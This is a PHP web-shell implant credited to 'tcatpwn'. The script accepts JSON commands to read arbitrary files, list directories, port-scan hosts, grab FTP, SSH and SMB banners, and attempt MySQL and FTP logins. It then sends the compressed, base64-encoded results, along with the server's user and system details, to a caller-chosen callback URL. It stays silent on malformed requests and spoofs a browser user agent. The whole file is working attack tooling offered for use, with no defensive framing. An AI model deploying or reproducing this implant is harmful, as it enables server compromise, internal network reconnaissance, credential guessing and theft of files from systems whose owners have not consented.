<?php
// Created by tcatpwn
// Version 1: 6/25/2025

set_time_limit(0);

// Read JSON input
$input = file_get_contents('php://input');
$data = json_decode($input, true);

// Validate required fields
if (!isset($data['action'], $data['target'], $data['callback'])) {
    http_response_code(204);
    exit;
}

$action = $data['action'];
$target = $data['target'];
$callback = $data['callback'];

$result = [
    'timestamp' => date('c'),
    'user' => get_current_user(),
    'system' => php_uname(),
    'action' => $action,
    'target' => $target,
    'result' => null,
];

switch ($action) {
    case 'readfile':
        $result['result'] = is_readable($target) ? file_get_contents($target) : "Unreadable or missing file";
        break;

    case 'scandir':
        $result['result'] = is_dir($target) ? scandir($target) : ["Not a directory or not found"];
        break;

    case 'portscan':
        $parts = explode(':', $target);
        $host = $parts[0];
        $port = isset($parts[1]) ? (int)$parts[1] : 80;

        $connection = fsockopen($host, $port, $errno, $errstr, 2);
        if ($connection) {
            $result['result'] = "Port $port open on $host";
            fclose($connection);
        } else {
            $result['result'] = "Port $port closed on $host or host unreachable";
        }
        break;

    case 'http_get':
        $ch = curl_init($target);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $resp = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);
        $result['http_response'] = $resp ?: '';
        if ($err) {
            $result['http_error'] = $err;
        }
        break;

    case 'dns_lookup':
        if (filter_var($target, FILTER_VALIDATE_IP)) {
            $hostname = gethostbyaddr($target);
            $result['dns_lookup'] = $hostname === false ? "No PTR record for $target" : $hostname;
        } else {
            $ip = gethostbyname($target);
            $result['dns_lookup'] = $ip === $target ? "DNS lookup failed or no change" : $ip;
        }
        break;

    case 'ftp_banner':
        $parts = explode(':', $target);
        $host = $parts[0];
        $port = isset($parts[1]) ? (int)$parts[1] : 21;
        $sock = fsockopen($host, $port, $errno, $errstr, 3);
        if ($sock) {
            $banner = fread($sock, 1024);
            fclose($sock);
            $result['ftp_banner'] = trim($banner);
        } else {
            $result['ftp_banner'] = "FTP closed or unreachable";
        }
        break;

    case 'mysql_login':
        $parts = explode(':', $target);
        $host = $parts[0];
        $port = isset($parts[1]) ? (int)$parts[1] : 3306;

        $username = isset($data['username']) ? $data['username'] : '';
        $password = isset($data['password']) ? $data['password'] : '';

        if ($username === '') {
            $result['mysql_login'] = "Missing username";
            break;
        }

        $mysqli = new mysqli($host, $username, $password, '', $port);

        if ($mysqli->connect_errno) {
            $result['mysql_login'] = "Failed to connect: " . $mysqli->connect_error;
        } else {
            $result['mysql_login'] = "Connected successfully to MySQL on $host:$port as $username";
            $mysqli->close();
        }
        break;

    case 'ssh_banner':
        $parts = explode(':', $target);
        $host = $parts[0];
        $port = isset($parts[1]) ? (int)$parts[1] : 22;
        $sock = fsockopen($host, $port, $errno, $errstr, 3);
        if ($sock) {
            $banner = fread($sock, 1024);
            fclose($sock);
            $result['ssh_banner'] = trim($banner);
        } else {
            $result['ssh_banner'] = "SSH closed or unreachable";
        }
        break;

    case 'ftp_login':
        $parts = explode(':', $target);
        $host = $parts[0];
        $port = isset($parts[1]) ? (int)$parts[1] : 21;

        $username = isset($data['username']) ? $data['username'] : 'anonymous';
        $password = isset($data['password']) ? $data['password'] : 'anonymous';
        $directory = isset($data['directory']) ? $data['directory'] : '/';

        $conn = ftp_connect($host, $port, 5);
        if (!$conn) {
            $result['ftp_login'] = "Could not connect to FTP server $host:$port";
            break;
        }

        $login = ftp_login($conn, $username, $password);
        if (!$login) {
            $result['ftp_login'] = "Login failed for $username on $host:$port";
            ftp_close($conn);
            break;
        }

        $list = ftp_nlist($conn, $directory);
        if ($list === false) {
            $result['ftp_login'] = "Login successful, but failed to list directory $directory";
        } else {
            $result['ftp_login'] = [
                'message' => "Login successful for $username on $host:$port",
                'directory' => $directory,
                'contents' => $list
            ];
        }

        ftp_close($conn);
        break;

    case 'smb_probe':
        $parts = explode(':', $target);
        $host = $parts[0];
        $port = isset($parts[1]) ? (int)$parts[1] : 445;
        $sock = fsockopen($host, $port, $errno, $errstr, 3);
        if ($sock) {
            fwrite($sock, "\x00"); // minimal packet to elicit response
            $banner = fread($sock, 512);
            fclose($sock);
            $result['smb_probe'] = bin2hex($banner);
        } else {
            $result['smb_probe'] = "SMB service not reachable on $host:$port";
        }
        break;


    default:
        $result['result'] = "Unknown action: $action";
        break;
}

// Encode and compress response
$encoded = base64_encode(gzcompress(json_encode($result), 9));

// Send result to callback URL
$ch = curl_init($callback);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $encoded);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/octet-stream']);
curl_setopt($ch, CURLOPT_TIMEOUT, 2);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
curl_exec($ch);
curl_close($ch);

http_response_code(200);
?>
